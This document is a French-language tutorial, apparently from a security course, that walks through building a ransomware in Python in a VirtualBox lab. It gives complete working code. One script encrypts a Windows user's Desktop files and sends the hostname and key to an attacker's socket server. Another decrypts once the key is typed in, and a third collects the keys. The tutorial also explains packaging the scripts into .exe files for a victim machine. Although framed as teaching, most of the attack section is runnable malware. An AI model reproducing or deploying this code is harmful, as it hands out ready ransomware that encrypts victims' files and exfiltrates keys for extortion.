# Références : 
- https://www.youtube.com/playlist?list=PL8KnQ7ULK8egs86oy1gRRa21CGDrEefPw
  
# Table des Matières

1. [Introduction](#1-introduction)
2. [Préparation de l'environnement](#-2-Préparation-environnement)
    1. [Installation de VirtualBox](#21-installation-de-virtualbox)
    2. [Installation de Windows 10 ISO](#22-installation-de-windows-10-iso)
    3. [Création d'une VM](#23-création-dune-vm)
    4. [Installation de Windows](#24-installation-de-windows)
    5. [Configuration initiale](#25-configuration-initiale)
3. [Création d'un Socket pour Établir la Connexion](#3-création-dun-socket-pour-établir-la-connexion)
    1. [Configuration du réseau en mode bridge](#31-configuration-du-réseau-en-mode-bridge)
    2. [Installation de Python et des bibliothèques nécessaires](#32-installation-de-python-et-des-bibliothèques-nécessaires)
    3. [Création d'un environnement virtuel (venv)](#33-création-dun-environnement-virtuel-venv)
    4. [Écriture du script Python pour le serveur](#34-écriture-du-script-python-pour-le-serveur)
    5. [Écriture du script Python pour le client](#35-écriture-du-script-python-pour-le-client)
    6. [Exécution et tests](#36-exécution-et-tests)
4. [Création d'un ransomware en Python](#4-création-dun-ransomware-en-python)
    1. [Création du script de chiffrement (ec.py)](#41-création-du-script-de-chiffrement-ecpy)
    2. [Création du script de déchiffrement (dc.py)](#42-création-du-script-de-déchiffrement-dcpy)
    3. [Création du script de serveur (server.py)](#43-création-du-script-de-serveur-serverpy)
    4. [Conversion des scripts Python en fichiers exécutables (.exe)](#44-conversion-des-scripts-python-en-fichiers-exécutables-exe)
    5. [Test dans une machine virtuelle](#45-test-dans-une-machine-virtuelle)
5. [Conclusion](#5-conclusion)

# 1. Introduction

Ce tutoriel vise à sensibiliser et à des fins pédagogiques en démontrant comment écrire des malwares en Python. Nous commencerons par préparer notre environnement et établirons une connexion socket entre une machine hôte et une machine virtuelle Windows. Ensuite, nous créerons un ransomware simple en Python.

[Revenir en haut](#table-des-matières)

---
# 2 Préparation environnement
---
#### 2.1 Installation de VirtualBox
Téléchargez et installez VirtualBox à partir du [site officiel](https://www.virtualbox.org/). Suivez les instructions d'installation par défaut.

[Revenir en haut](#table-des-matières)

#### 2.2 Installation de Windows 10 ISO
## Option 1 - Téléchargez l'ISO de Windows 10 depuis le site officiel de Microsoft.
## Option 2 ==> https://github.com/hrhouma/securite-logiciels-applications/blob/main/1%20-%20Introduction%20%C3%A0%20la%20S%C3%A9curit%C3%A9%20des%20Logiciels%20et%20des%20Applications/TP0-WINDOWS10/02.md
[Revenir en haut](#table-des-matières)

#### 2.3 Création d'une VM
1. Ouvrez VirtualBox et cliquez sur "New".
2. Nommez votre VM et sélectionnez le type et la version appropriés.
3. Allouez de la mémoire et créez un disque dur virtuel en suivant les instructions.

[Revenir en haut](#table-des-matières)

#### 2.4 Installation de Windows
1. Démarrez votre VM et sélectionnez l'ISO de Windows 10 comme disque de démarrage.
2. Suivez les instructions d'installation de Windows.

[Revenir en haut](#table-des-matières)

#### 2.5 Configuration initiale
1. Après l'installation, configurez Windows avec les paramètres par défaut.
2. Installez Python et configurez l'environnement.

[Revenir en haut](#table-des-matières)

---
### 3. Création d'un Socket pour Établir la Connexion
---
Configurez deux adaptateurs réseau de votre machine virtuelle windows 10, un en mode "Bridge Adapter" et l'autre en mode "NAT Network", suivez ces étapes :

### Adapter 1 (Bridge Adapter)
1. Ouvrez les paramètres de votre machine virtuelle dans VirtualBox.
2. Allez à l'onglet "Réseau".
3. Assurez-vous que "Adapter 1" est activé.
4. Sélectionnez "Attaché à: Bridge Adapter" dans le menu déroulant.
5. Choisissez votre adaptateur réseau physique (par exemple "Intel(R) Wi-Fi 6 AX201 160MHz") dans la liste déroulante sous "Nom".
6. Cliquez sur "OK" pour enregistrer les paramètres.

### Adapter 2 (NAT Network)
1. Sélectionnez "Adapter 2" dans l'onglet "Réseau".
2. Assurez-vous que "Adapter 2" est activé.
3. Sélectionnez "Attaché à: NAT Network" dans le menu déroulant.
4. Assurez-vous que le nom du réseau NAT est correctement sélectionné, comme "NatNetwork".
5. Cliquez sur "OK" pour enregistrer les paramètres.

Avec ces configurations, "Adapter 1" permettra à votre machine virtuelle de se connecter directement à votre réseau local en utilisant votre carte réseau physique, tandis que "Adapter 2" utilisera le réseau NAT pour une connexion Internet facilitée. Assurez-vous de vérifier que les réglages sont corrects pour éviter tout problème de connexion.

# Carte 1
![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/c44845df-6e51-4eda-b3b6-b0c51a83fef7)
# Carte 2
![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/9266e6ca-c9ee-4c91-aa2e-ed3626c9dda1)


[Revenir en haut](#table-des-matières)

#### 3.2 Installation de Python et des bibliothèques nécessaires
Téléchargez et installez Python à partir du [site officiel](https://www.python.org/downloads/). Assurez-vous de cocher l'option pour ajouter Python au PATH lors de l'installation.

[Revenir en haut](#table-des-matières)

#### 3.3 Création d'un environnement virtuel (venv)
1. Ouvrez l'invite de commande sur votre machine hôte.
2. Créez un nouveau dossier pour votre projet :
- Appelez le par exemple malware-pedagogique
- Allez dans le dossier malware-pedagogique
3. Créez un environnement virtuel :
```bash
python -m venv venv
```
4. Activez l'environnement virtuel :
```bash
venv\Scripts\activate
```
5. Installez les bibliothèques nécessaires :
```bash
pip install socket
```
# Important en cas d'erreur: 
- Pas besoin d'installer socket avec pip dans les nouvelles versions. C'est déja intégré dans python.
[Revenir en haut](#table-des-matières)

#### 3.4 Écriture du script Python pour le serveur
Créez un fichier `server.py` et ajoutez le code suivant :

```python
import socket

SERVER_IP = '192.168.1.85'  # Remplacez par l'adresse IP de votre machine hôte
SERVER_PORT = 5678

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((SERVER_IP, SERVER_PORT))
    s.listen(1)
    conn, addr = s.accept()
    with conn:
        print(f'Connection established from: {addr}')
        while True:
            data = conn.recv(1024)
            if not data:
                break
            conn.sendall(data)
```

[Revenir en haut](#table-des-matières)

#### 3.5 Écriture du script Python pour le client
Créez un fichier `client.py` sur votre machine virtuelle et ajoutez le code suivant :

```python
import socket

SERVER_IP = '192.168.1.85'  # Remplacez par l'adresse IP de votre machine hôte
SERVER_PORT = 5678

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((SERVER_IP, SERVER_PORT))
    s.sendall(b'Hello, world')
    data = s.recv(1024)

print(f'Received {data!r}')
```

[Revenir en haut](#table-des-matières)

#### 3.6 Exécution et tests
1. Démarrez le script serveur sur la machine hôte :
```bash
python server.py
```
2. Démarrez le script client sur la machine virtuelle :
```bash
python client.py
```

[Revenir en haut](#table-des-matières)

---------

# RÉSUMÉ DE LA PARTIE 1:

#### 1. Création du dossier malware-pédagogique
#### 2. Ajout des deux scripts client.py et server.py 
#### 3. Créer un dossier partagé entre votre machine host (Ma vrai machine Windows 11) et la machine guest attaquée (VM windows 10)
#### 4. Il faut comprendre que la machine host (Ma vrai machine Windows 11) va attaquer la machine guest (la VM windows 10)
#### 5. Et donc, pour tester la connectiveté entre les deux, il faut pinger la machine guest depuis la machine host ping 10.0.0.63 , dans mon cas. Aussi, il faut placer client.py dans la machine attaquée (la VM windows 10) et garder le serveur (server.py) dans le dossier  malware-pédagogique sur ma machine host.
#### 6. Testez la connectivité avec les sockets en utilisant les commandes suivantes
##### Au niveau de la machine host (windows 11) dans le dossier malware pédagogique
- Installez python3.9 ou 3.10 ou 3.11 ou 3.12
- Allez au dossier malware-pedagogique
```bash
pip3 install virtualenv
python3 -m venv fofana
fofana\Scripts\activate
python3 server.py
```
##### Au niveau de la machine guest (VM windows 10) dans le dossier malware 
- Installez python3.9 ou 3.10 ou 3.11 ou 3.12
- Copier le fichier client.py à partir du dossier partagé sur wwindows dans un dossier malware dans Documents sur la VM windows 10
```bash
python client.py
```
# IMPORTANT - vérifiez que vous avez les bonnes adresses dans client.py (MACHINE GUEST, dossier malware dans documents) et server.py (MACHINE HOST, Documents/malware-pedagogique)

![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/413fc91e-d755-40ea-bab9-48f2a7c67aeb)

![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/52cea9df-165f-4132-a081-3405461395b6)

- Si vous recevez le message suivant, c'est que vous êtes connectés et le socket marche bien :
- Côté server : Connection established from: ('10.0.0.63', 63809)
- Côté client (machine attaquée) -  Received b'Hello World'

#### 7. Supprimer les fichiers client.py et server.py (c'était pour tester les sockets)
#### 8. On passe à l'attaque

# Fin de la partie 1 (SUPPRIMEZ LES FICHIERS CLIENT.PY ET SERVER.PY)
- C'était juste pour tester la connectivité avec les sockets
---
# Début de la partie 2 (Nous allons utiser 3 nouveaux fichiers)
- ec.py (machine victime)
- dc.py (machine victime)
- server.py (machine attaquante)

![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/e0563f09-1b33-4bc6-a51d-23a8946cf6da)

- Nous allons commencer par créer les 3 fichiers dans le dossier malware pedagogique dans windows 11 de la machien attaquante et ensuite déplacer ec.py et dc.py à la machine attquée.
- Il est à noter que le but de la partie 2 est de tester avec python. C'est au niveau de la partie 3 que nous allons créer les exécutables d'attaque.
- Au niveau de la partie 4, je vous fais un résumé sur la mécanique de cette attaque.

# ✈️ IMPORTANT - N'oubliez pas de changez les adresses IP dans ec.py (👿) et server.py (pas besoin dans dc.py (🧞))
# Dans mon cas,c'est 10.0.0.63 à la place de 192.168.1.85, vous pouvez garder les ports telles qu'ils sont
--------
### 4. Création d'un ransomware en Python

#### 4.1 Création du script de chiffrement (ec.py)

Ce script chiffre les fichiers et envoie la clé de chiffrement au serveur.

```python
import socket
import os
import threading
import queue
import random

# Fonction de chiffrement
def encrypt(key):
    while True:
        file = q.get()
        print(f'Encrypting {file}')
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            
            with open(file, 'rb') as f:
                data = f.read()
            
            with open(file, 'w') as f:
                f.write('')
            
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                
                # Incrémenter l'index de la clé
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            
            print(f'{file} successfully encrypted')
        except:
            print(f'Failed to encrypt file :(')
        q.task_done()

# Informations de socket
IP_ADDRESS = '192.168.1.85'
PORT = 5678

# Informations sur le chiffrement
ENCRYPTION_LEVEL = 512 // 8  # 512 bit encryption = 64 bytes
key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./[]{}|'
key_char_pool_len = len(key_char_pool)

# Préparer les fichiers à crypter
print("Preparing files...")
desktop_path = os.environ['USERPROFILE'] + '\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2] + 'exe':
        abs_files.append(f'{desktop_path}\\{f}')
print("Successfully located all files!")

# Obtenir le nom d'hôte du client
hostname = os.getenv('COMPUTERNAME')

# Générer la clé de chiffrement
print("Generating encryption key...")
key = ''
for i in range(

ENCRYPTION_LEVEL):
    key += key_char_pool[random.randint(0, key_char_pool_len - 1)]
print("Key Generated!!!")

# Se connecter au serveur pour transférer la clé et le nom d'hôte
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP_ADDRESS, PORT))
    print('Successfully connected... transmitting hostname and key')
    s.send(f'{hostname} : {key}'.encode('utf-8'))
    print('Finished transmitting data!')
    s.close()

# Créer la file d'attente des fichiers à crypter
q = queue.Queue()
for f in abs_files:
    q.put(f)

# Configurer les threads pour le chiffrement
for i in range(10):
    t = threading.Thread(target=encrypt, args=(key,), daemon=True)
    t.start()

q.join()
print('Encryption and upload complete!!!')
input()
```

[Revenir en haut](#table-des-matières)

#### 4.2 Création du script de déchiffrement (dc.py)

Ce script déchiffre les fichiers cryptés en utilisant une clé fournie par l'utilisateur.

```python
import os
import threading
import queue

# Fonction de décryptage
def decrypt(key):
    while True:
        file = q.get()
        print(f'Decrypting {file}')
        try:
            key_index = 0
            max_key_index = len(key) - 1
            decrypted_data = ''
            
            with open(file, 'rb') as f:
                data = f.read()
            
            with open(file, 'w') as f:
                f.write('')
            
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                
                # Incrementer l'index de la clé
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            
            print(f'{file} successfully decrypted')
        except:
            print(f'Failed to decrypt file :(')
        q.task_done()

# Informations sur le chiffrement
ENCRYPTION_LEVEL = 512 // 8  # 512 bit encryption = 64 bytes
key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./[]{}|'
key_char_pool_len = len(key_char_pool)

# Préparer les fichiers à décrypter
print("Preparing files...")
desktop_path = os.environ['USERPROFILE'] + '\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2] + 'exe':
        abs_files.append(f'{desktop_path}\\{f}')
print("Successfully located all files!")

# Demander la clé de décryptage
key = input("Please enter the decryption key if you want your files back: ")

# Créer la file d'attente des fichiers à décrypter
q = queue.Queue()
for f in abs_files:
    q.put(f)

# Configurer les threads pour le décryptage
for i in range(10):
    t = threading.Thread(target=decrypt, args=(key,), daemon=True)
    t.start()

q.join()
print('Decryption is completed!!!')
```

[Revenir en haut](#table-des-matières)

#### 4.3 Création du script de serveur (server.py)

Ce script crée un serveur pour recevoir la clé de chiffrement et le nom d'hôte du client.

```python
import socket

IP_ADDRESS = '192.168.1.85'
PORT = 5678

print('Creating Socket')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP_ADDRESS, PORT))
    print('Listening for connections...')
    s.listen(1)
    conn, addr = s.accept()
    print(f'Connection from {addr} established!')
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_key + '\n')
            break
        print('Connection completed and closed!')
```

[Revenir en haut](#table-des-matières)


---------

# RÉSUMÉ DE LA PARTIE 2:



#### 1. Création des 3 fichiers ec.py , dc.py et server.py
#### 2. Copier coller les conetnus à partir du contenu ci-haut (il faut juste changer l'adresse IP avec la bonne dans ec.py et server.py)
#### 3. Créer un dossier partagé entre votre machine host (Ma vrai machine Windows 11) et la machine guest attaquée (VM windows 10)
#### 4. Il faut comprendre que la machine host (Ma vrai machine Windows 11) va attaquer la machine guest (la VM windows 10)
#### 7. Création de deux fichiers exemples dans le bureau de la machine attaquée avec du texte en claire (par exemple , mes-documents-importants.txt et mes-documents-importants.docx et mettre du contenu (par exemple avec =lorem(1000) pour ajouter du texte aléatoire dans le fichier word).

##### Au niveau de la machine host (windows 11) dans le dossier malware pédagogique, on lancer 
- Allez au dossier malware-pedagogique
```bash
python3 server.py
```
##### Au niveau de la machine cible (la VM windows 10) dans le dossier malware 
```bash
python ec.py
```
#### 8.  Allez au bureau et essayer d'ouvrir les fichiers  mes-documents-importants.txt et mes-documents-importants.docx (contenu encrypté 😧).
#### 9.  Au niveau de la machine host (windows 11) dans le dossier malware pédagogique ou nous avons le server.py, observez qu'il y a un fichier *encrypted_hosts.txt* avec le nom de la machine attaquée et une clé pour déchiffrer.
#### 10. Dans la vraie vie, cette clé est envoyée lorsque le socket était ouvert , c'est une clé que le hacker utilisera pour harceler la victime pour demander un rançon ! 
#### 11. Au niveau de la machine windows 10 VM (attquée), nous allons exécuter la commande suivante
```bash
python dc.py
```
#### 12. Rentrez la clé (N'oubliez pas d'envoyer le fichier *encrypted_hosts.txt*  dans le dossier partager pour copier et coller la clé.
#### 13. Observez les fichiers sur le desktop de la machine VM attaquér (les fichiers sont décryptés et les données sont récupérés).
#### 14 . redéplacez les fichiers ec.py et dc.py à la machine host pour les tranformer en exécutables (PARTIE 3)
# IMPORTANT - vérifiez que vous avez les bonnes adresses dans client.py (MACHINE GUEST, dossier malware dans documents) et server.py (MACHINE HOST, Documents/malware-pedagogique)



# FIN DE LA PARTIE 2
-----
# DÉBUT DE LA PARTIE 3 (Les exécutables):
#### 4.4 Conversion des scripts Python en fichiers exécutables (.exe)

Utilisez l'outil `auto-py-to-exe` pour convertir vos scripts Python en fichiers exécutables.

```bash
pip install auto-py-to-exe
```

Lancez l'interface `auto-py-to-exe`.

```bash
auto-py-to-exe
```

Sélectionnez le fichier `ec.py` pour le convertir en `ec.exe`. Répétez l'opération pour `dc.py`.

1. Ouvrez `auto-py-to-exe`.
2. Sélectionnez `ec.py` comme script à convertir.
3. Choisissez `One Directory` et `Console Based`.
4. Cliquez sur `Convert .py to .exe`.
5. Répétez pour `dc.py`.

[Revenir en haut](#table-des-matières)

#### 4.5 Test dans une machine virtuelle

Utilisez une machine virtuelle pour tester les fichiers exécutables. Déposez `ec.exe` sur la machine virtuelle pour chiffrer les fichiers et envoyez la clé au serveur. Utilisez `dc.exe` pour déchiffrer les fichiers avec la clé appropriée.

[Revenir en haut](#table-des-matières)

### 5. Conclusion

Ce tutoriel vous a guidé à travers les étapes de création d'un ransomware simple en Python. Nous avons couvert la préparation de l'environnement, la configuration de la connexion socket, et la création des scripts de chiffrement et de déchiffrement. N'oubliez pas que ce tutoriel est uniquement à des fins éducatives. Utilisez ces connaissances de manière éthique et responsable.

[Revenir en haut](#table-des-matières)

#
[3:24 PM] François Barthe
Panneau de configuration\Tous les Panneaux de configuration\Connexions réseau
[3:27 PM] François Barthe
Ou on entre ça dans la barre de recherche :
 
Connexions réseau
